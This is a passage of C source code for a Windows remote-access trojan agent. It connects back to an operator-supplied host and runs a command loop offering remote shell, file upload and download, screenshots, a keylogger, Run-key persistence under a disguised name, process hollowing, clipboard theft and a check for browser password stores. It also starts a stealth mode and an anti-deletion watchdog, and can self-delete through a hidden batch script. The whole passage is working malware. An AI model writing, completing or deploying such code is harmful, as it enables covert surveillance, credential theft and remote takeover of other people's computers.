    send_frame(client, CMD_SYSINFO, (uint8_t*)info, (uint32_t)strlen(info));
}

static void cmd_clipboard(SOCKET client) {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char* clipboard_text = (char*)GlobalLock(hData);
            if (clipboard_text) {
                size_t text_len = strlen(clipboard_text);
                if (text_len > 0) {
                    send_frame(client, CMD_CLIPBOARD, (uint8_t*)clipboard_text, (uint32_t)text_len);
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

static void cmd_browser_passwords(SOCKET client) {
    char result[2048] = {0};
    char chrome_path[MAX_PATH];
    char firefox_path[MAX_PATH];
    char edge_path[MAX_PATH];
    
    GetEnvironmentVariableA("LOCALAPPDATA", chrome_path, MAX_PATH);
    strcat(chrome_path, "\\Google\\Chrome\\User Data\\Default\\Login Data");
    
    GetEnvironmentVariableA("APPDATA", firefox_path, MAX_PATH);
    strcat(firefox_path, "\\Mozilla\\Firefox\\Profiles");
    
    GetEnvironmentVariableA("LOCALAPPDATA", edge_path, MAX_PATH);
    strcat(edge_path, "\\Microsoft\\Edge\\User Data\\Default\\Login Data");
    
    snprintf(result, sizeof(result),
        "Chrome: %s\nFirefox: %s\nEdge: %s\n",
        (GetFileAttributesA(chrome_path) != INVALID_FILE_ATTRIBUTES) ? "Found" : "Not found",
        (GetFileAttributesA(firefox_path) != INVALID_FILE_ATTRIBUTES) ? "Found" : "Not found",
        (GetFileAttributesA(edge_path) != INVALID_FILE_ATTRIBUTES) ? "Found" : "Not found");
    
    send_frame(client, CMD_BROWSER_PASS, (uint8_t*)result, (uint32_t)strlen(result));
}

static void cmd_uninstall(SOCKET client) {
    send_frame(client, CMD_UNINSTALL, (uint8_t*)"Uninstalling...", 15);
    
    RegDeleteKeyA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ehSched");
    
    char bat_path[MAX_PATH];
    char exe_path[MAX_PATH];
    GetTempPathA(MAX_PATH, bat_path);
    strcat(bat_path, "uninst.bat");
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    
    FILE* bat = fopen(bat_path, "w");
    if (bat) {
        fprintf(bat, "@echo off\n");
        fprintf(bat, ":loop\n");
        fprintf(bat, "timeout /t 1 /nobreak >nul\n");
        fprintf(bat, "del /F /Q \"%s\" 2>nul\n", exe_path);
        fprintf(bat, "if exist \"%s\" goto loop\n", exe_path);
        fprintf(bat, "del /F /Q \"%%~f0\" 2>nul\n");
        fclose(bat);
        ShellExecuteA(NULL, "open", bat_path, NULL, NULL, SW_HIDE);
    }
    
    exit(0);
}

// ========== MAIN ==========
int main(int argc, char** argv) {
    const char* host = DEFAULT_HOST;
    int port = DEFAULT_PORT;
    
    // Try command line first
    if (argc > 1) {
        host = argv[1];
        if (argc > 2) {
            port = atoi(argv[2]);
        }
        DEBUG_PRINT("[AGENT] Using command line: %s:%d\n", host, port);
    } else {
        // Load saved connection info
        load_connection_info();
        if (g_saved_host[0]) {
            host = g_saved_host;
            port = g_saved_port;
            DEBUG_PRINT("[AGENT] Using saved connection: %s:%d\n", host, port);
        } else {
            DEBUG_PRINT("[AGENT] Using defaults: %s:%d\n", host, port);
        }
    }
    
    #ifdef _WIN32
        init_stealth();
        
        WSADATA wsa;
        WSAStartup(MAKEWORD(2, 2), &wsa);
        
        DEBUG_PRINT("[AGENT] Starting in stealth mode...\n");
        DEBUG_PRINT("[AGENT] Target: %s:%d\n", host, port);
        
        CreateThread(NULL, 0, watchdog_thread, NULL, 0, NULL);
        DEBUG_PRINT("[AGENT] Anti-deletion watchdog started\n");
    #endif
    
    while (1) {
        DEBUG_PRINT("[AGENT] Connecting to %s:%d...\n", host, port);
        
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            sleep(RETRY_DELAY);
            continue;
        }
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)port);
        addr.sin_addr.s_addr = inet_addr(host);
        
        int retry_count = 0;
        while (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0 && retry_count < MAX_RETRIES) {
            DEBUG_PRINT("[AGENT] Connection failed (attempt %d/%d)\n", retry_count + 1, MAX_RETRIES);
            SOCKET_CLOSE(sock);
            sleep(RETRY_DELAY);
            sock = socket(AF_INET, SOCK_STREAM, 0);
            if (sock == INVALID_SOCKET) break;
            retry_count++;
        }
        
        if (retry_count >= MAX_RETRIES) {
            DEBUG_PRINT("[AGENT] All connection attempts failed, retrying...\n");
            continue;
        }
        
        DEBUG_PRINT("[AGENT] Connected successfully!\n");
        
        // Save connection info for future reconnections
        save_connection_info(host, port);
        
        start_keylogger();
        CreateThread(NULL, 0, heartbeat_thread, (LPVOID)(intptr_t)sock, 0, NULL);
        
        while (1) {
            uint8_t cmd = 0;
            uint8_t* payload = NULL;
            uint32_t payload_len = 0;
            
            if (recv_frame(sock, &cmd, &payload, &payload_len) != 0) {
                DEBUG_PRINT("[AGENT] Connection lost, reconnecting...\n");
                stop_keylogger();
                break;
            }
            
            DEBUG_PRINT("[AGENT] Command: 0x%02X\n", cmd);
            
            switch (cmd) {
                case CMD_SHELL: cmd_shell(sock, payload, payload_len); break;
                case CMD_UPLOAD: cmd_upload(sock, payload, payload_len); break;
                case CMD_DOWNLOAD: cmd_download(sock, payload, payload_len); break;
                case CMD_SCREENSHOT: cmd_screenshot(sock); break;
                case CMD_KEYSTROKE: cmd_keystroke(sock); break;
                case CMD_PERSIST: cmd_persist(sock); break;
                case CMD_UNINSTALL: cmd_uninstall(sock); break;
                case CMD_SYSINFO: cmd_sysinfo(sock); break;
                case CMD_CLIPBOARD: cmd_clipboard(sock); break;
                case CMD_BROWSER_PASS: cmd_browser_passwords(sock); break;
                case CMD_HOLLOW: cmd_hollow(sock, payload, payload_len); break;
                case CMD_POPUP: cmd_popup(sock, payload, payload_len); break;
                default: break;
            }
            
            if (payload) free(payload);
        }
        
        SAFE_CLOSE(sock);
        DEBUG_PRINT("[AGENT] Waiting %d seconds before reconnect...\n", RETRY_DELAY);
        sleep(RETRY_DELAY);
    }
    
    return 0;
}
